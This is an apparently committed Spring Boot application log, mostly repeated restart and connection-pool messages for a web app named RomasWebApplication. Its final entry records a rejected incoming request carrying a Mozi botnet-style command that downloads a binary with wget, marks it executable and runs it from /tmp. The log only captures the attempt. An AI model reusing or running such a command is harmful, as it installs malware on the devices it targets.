+2021-11-04 22:18:03.756  INFO 43916 --- [Thread-29] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown initiated...
+2021-11-04 22:18:03.758  INFO 43916 --- [Thread-29] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown completed.
+2021-11-04 22:18:03.865  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Starting RomasWebApplication using Java 1.8.0_251 on DESKTOP-08OF09U with PID 43916 (C:\Users\hgko\git\romas-web\romas-web\target\classes started by hgko in C:\Users\hgko\git\romas-web\romas-web)
+2021-11-04 22:18:03.865  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : No active profile set, falling back to default profiles: default
+2021-11-04 22:18:03.994  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2021-11-04 22:18:04.013  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 18 ms. Found 2 JPA repository interfaces.
+2021-11-04 22:18:04.068  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8080 (http)
+2021-11-04 22:18:04.069  INFO 43916 --- [restartedMain] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
+2021-11-04 22:18:04.069  INFO 43916 --- [restartedMain] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.54]
+2021-11-04 22:18:04.078  INFO 43916 --- [restartedMain] o.a.c.c.C.[Tomcat].[localhost].[/romas]  : Initializing Spring embedded WebApplicationContext
+2021-11-04 22:18:04.079  INFO 43916 --- [restartedMain] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 212 ms
+2021-11-04 22:18:04.103  INFO 43916 --- [restartedMain] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
+2021-11-04 22:18:04.105  WARN 43916 --- [restartedMain] com.zaxxer.hikari.HikariConfig           : SpringBootJPAHikariCP - idleTimeout has been set but has no effect because the pool is operating as a fixed size pool.
+2021-11-04 22:18:04.105  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Starting...
+2021-11-04 22:18:04.181  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Start completed.
+2021-11-04 22:18:04.181  INFO 43916 --- [restartedMain] org.hibernate.dialect.Dialect            : HHH000400: Using dialect: org.hibernate.dialect.MySQL5Dialect
+2021-11-04 22:18:04.202  INFO 43916 --- [restartedMain] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
+2021-11-04 22:18:04.202  INFO 43916 --- [restartedMain] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 22:18:04.284  WARN 43916 --- [restartedMain] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+2021-11-04 22:18:04.332  INFO 43916 --- [restartedMain] o.s.b.d.a.OptionalLiveReloadServer       : LiveReload server is running on port 35729
+2021-11-04 22:18:04.340  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path '/romas'
+2021-11-04 22:18:04.343  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Started RomasWebApplication in 0.501 seconds (JVM running for 1097.814)
+2021-11-04 22:18:04.343  INFO 43916 --- [restartedMain] .ConditionEvaluationDeltaLoggingListener : Condition evaluation unchanged
+2021-11-04 22:18:06.958  INFO 43916 --- [Thread-33] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 22:18:06.958  INFO 43916 --- [Thread-33] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown initiated...
+2021-11-04 22:18:06.960  INFO 43916 --- [Thread-33] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown completed.
+2021-11-04 22:18:07.113  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Starting RomasWebApplication using Java 1.8.0_251 on DESKTOP-08OF09U with PID 43916 (C:\Users\hgko\git\romas-web\romas-web\target\classes started by hgko in C:\Users\hgko\git\romas-web\romas-web)
+2021-11-04 22:18:07.113  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : No active profile set, falling back to default profiles: default
+2021-11-04 22:18:07.240  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2021-11-04 22:18:07.257  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 16 ms. Found 2 JPA repository interfaces.
+2021-11-04 22:18:07.312  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8080 (http)
+2021-11-04 22:18:07.312  INFO 43916 --- [restartedMain] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
+2021-11-04 22:18:07.312  INFO 43916 --- [restartedMain] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.54]
+2021-11-04 22:18:07.322  INFO 43916 --- [restartedMain] o.a.c.c.C.[Tomcat].[localhost].[/romas]  : Initializing Spring embedded WebApplicationContext
+2021-11-04 22:18:07.322  INFO 43916 --- [restartedMain] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 208 ms
+2021-11-04 22:18:07.350  INFO 43916 --- [restartedMain] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
+2021-11-04 22:18:07.353  WARN 43916 --- [restartedMain] com.zaxxer.hikari.HikariConfig           : SpringBootJPAHikariCP - idleTimeout has been set but has no effect because the pool is operating as a fixed size pool.
+2021-11-04 22:18:07.353  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Starting...
+2021-11-04 22:18:07.437  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Start completed.
+2021-11-04 22:18:07.437  INFO 43916 --- [restartedMain] org.hibernate.dialect.Dialect            : HHH000400: Using dialect: org.hibernate.dialect.MySQL5Dialect
+2021-11-04 22:18:07.456  INFO 43916 --- [restartedMain] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
+2021-11-04 22:18:07.456  INFO 43916 --- [restartedMain] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 22:18:07.536  WARN 43916 --- [restartedMain] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+2021-11-04 22:18:07.584  INFO 43916 --- [restartedMain] o.s.b.d.a.OptionalLiveReloadServer       : LiveReload server is running on port 35729
+2021-11-04 22:18:07.591  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path '/romas'
+2021-11-04 22:18:07.594  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Started RomasWebApplication in 0.501 seconds (JVM running for 1101.066)
+2021-11-04 22:18:07.595  INFO 43916 --- [restartedMain] .ConditionEvaluationDeltaLoggingListener : Condition evaluation unchanged
+2021-11-04 22:18:31.450  INFO 43916 --- [Thread-37] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 22:18:31.450  INFO 43916 --- [Thread-37] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown initiated...
+2021-11-04 22:18:31.451  INFO 43916 --- [Thread-37] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown completed.
+2021-11-04 22:18:31.586  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Starting RomasWebApplication using Java 1.8.0_251 on DESKTOP-08OF09U with PID 43916 (C:\Users\hgko\git\romas-web\romas-web\target\classes started by hgko in C:\Users\hgko\git\romas-web\romas-web)
+2021-11-04 22:18:31.586  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : No active profile set, falling back to default profiles: default
+2021-11-04 22:18:31.741  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2021-11-04 22:18:31.761  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 20 ms. Found 2 JPA repository interfaces.
+2021-11-04 22:18:31.858  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8080 (http)
+2021-11-04 22:18:31.858  INFO 43916 --- [restartedMain] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
+2021-11-04 22:18:31.858  INFO 43916 --- [restartedMain] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.54]
+2021-11-04 22:18:31.870  INFO 43916 --- [restartedMain] o.a.c.c.C.[Tomcat].[localhost].[/romas]  : Initializing Spring embedded WebApplicationContext
+2021-11-04 22:18:31.870  INFO 43916 --- [restartedMain] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 283 ms
+2021-11-04 22:18:31.899  INFO 43916 --- [restartedMain] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
+2021-11-04 22:18:31.902  WARN 43916 --- [restartedMain] com.zaxxer.hikari.HikariConfig           : SpringBootJPAHikariCP - idleTimeout has been set but has no effect because the pool is operating as a fixed size pool.
+2021-11-04 22:18:31.902  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Starting...
+2021-11-04 22:18:31.985  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Start completed.
+2021-11-04 22:18:31.985  INFO 43916 --- [restartedMain] org.hibernate.dialect.Dialect            : HHH000400: Using dialect: org.hibernate.dialect.MySQL5Dialect
+2021-11-04 22:18:32.004  INFO 43916 --- [restartedMain] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
+2021-11-04 22:18:32.004  INFO 43916 --- [restartedMain] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 22:18:32.082  WARN 43916 --- [restartedMain] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+2021-11-04 22:18:32.129  INFO 43916 --- [restartedMain] o.s.b.d.a.OptionalLiveReloadServer       : LiveReload server is running on port 35729
+2021-11-04 22:18:32.136  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path '/romas'
+2021-11-04 22:18:32.138  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Started RomasWebApplication in 0.578 seconds (JVM running for 1125.61)
+2021-11-04 22:18:32.139  INFO 43916 --- [restartedMain] .ConditionEvaluationDeltaLoggingListener : Condition evaluation unchanged
+2021-11-04 22:18:57.712  INFO 43916 --- [Thread-41] j.LocalContainerEntityManagerFactoryBean : Closing JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 22:18:57.712  INFO 43916 --- [Thread-41] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown initiated...
+2021-11-04 22:18:57.713  INFO 43916 --- [Thread-41] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Shutdown completed.
+2021-11-04 22:18:57.874  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Starting RomasWebApplication using Java 1.8.0_251 on DESKTOP-08OF09U with PID 43916 (C:\Users\hgko\git\romas-web\romas-web\target\classes started by hgko in C:\Users\hgko\git\romas-web\romas-web)
+2021-11-04 22:18:57.874  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : No active profile set, falling back to default profiles: default
+2021-11-04 22:18:58.005  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2021-11-04 22:18:58.022  INFO 43916 --- [restartedMain] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 17 ms. Found 2 JPA repository interfaces.
+2021-11-04 22:18:58.077  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8080 (http)
+2021-11-04 22:18:58.078  INFO 43916 --- [restartedMain] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
+2021-11-04 22:18:58.078  INFO 43916 --- [restartedMain] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.54]
+2021-11-04 22:18:58.087  INFO 43916 --- [restartedMain] o.a.c.c.C.[Tomcat].[localhost].[/romas]  : Initializing Spring embedded WebApplicationContext
+2021-11-04 22:18:58.087  INFO 43916 --- [restartedMain] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 212 ms
+2021-11-04 22:18:58.113  INFO 43916 --- [restartedMain] o.hibernate.jpa.internal.util.LogHelper  : HHH000204: Processing PersistenceUnitInfo [name: default]
+2021-11-04 22:18:58.115  WARN 43916 --- [restartedMain] com.zaxxer.hikari.HikariConfig           : SpringBootJPAHikariCP - idleTimeout has been set but has no effect because the pool is operating as a fixed size pool.
+2021-11-04 22:18:58.115  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Starting...
+2021-11-04 22:18:58.206  INFO 43916 --- [restartedMain] com.zaxxer.hikari.HikariDataSource       : SpringBootJPAHikariCP - Start completed.
+2021-11-04 22:18:58.206  INFO 43916 --- [restartedMain] org.hibernate.dialect.Dialect            : HHH000400: Using dialect: org.hibernate.dialect.MySQL5Dialect
+2021-11-04 22:18:58.224  INFO 43916 --- [restartedMain] o.h.e.t.j.p.i.JtaPlatformInitiator       : HHH000490: Using JtaPlatform implementation: [org.hibernate.engine.transaction.jta.platform.internal.NoJtaPlatform]
+2021-11-04 22:18:58.224  INFO 43916 --- [restartedMain] j.LocalContainerEntityManagerFactoryBean : Initialized JPA EntityManagerFactory for persistence unit 'default'
+2021-11-04 22:18:58.304  WARN 43916 --- [restartedMain] JpaBaseConfiguration$JpaWebConfiguration : spring.jpa.open-in-view is enabled by default. Therefore, database queries may be performed during view rendering. Explicitly configure spring.jpa.open-in-view to disable this warning
+2021-11-04 22:18:58.352  INFO 43916 --- [restartedMain] o.s.b.d.a.OptionalLiveReloadServer       : LiveReload server is running on port 35729
+2021-11-04 22:18:58.359  INFO 43916 --- [restartedMain] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path '/romas'
+2021-11-04 22:18:58.362  INFO 43916 --- [restartedMain] net.woori.romas.RomasWebApplication      : Started RomasWebApplication in 0.512 seconds (JVM running for 1151.833)
+2021-11-04 22:18:58.362  INFO 43916 --- [restartedMain] .ConditionEvaluationDeltaLoggingListener : Condition evaluation unchanged
+2021-11-04 22:19:02.389  INFO 43916 --- [http-nio-8080-exec-1] o.a.c.c.C.[Tomcat].[localhost].[/romas]  : Initializing Spring DispatcherServlet 'dispatcherServlet'
+2021-11-04 22:19:02.389  INFO 43916 --- [http-nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Initializing Servlet 'dispatcherServlet'
+2021-11-04 22:19:02.390  INFO 43916 --- [http-nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 1 ms
+2021-11-04 23:50:16.609  INFO 43916 --- [http-nio-8080-exec-8] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ ]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:419) ~[tomcat-embed-core-9.0.54.jar:9.0.54]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:269) ~[tomcat-embed-core-9.0.54.jar:9.0.54]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.54.jar:9.0.54]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:895) [tomcat-embed-core-9.0.54.jar:9.0.54]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1722) [tomcat-embed-core-9.0.54.jar:9.0.54]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.54.jar:9.0.54]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) [tomcat-embed-core-9.0.54.jar:9.0.54]
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) [tomcat-embed-core-9.0.54.jar:9.0.54]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.54.jar:9.0.54]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_251]
+
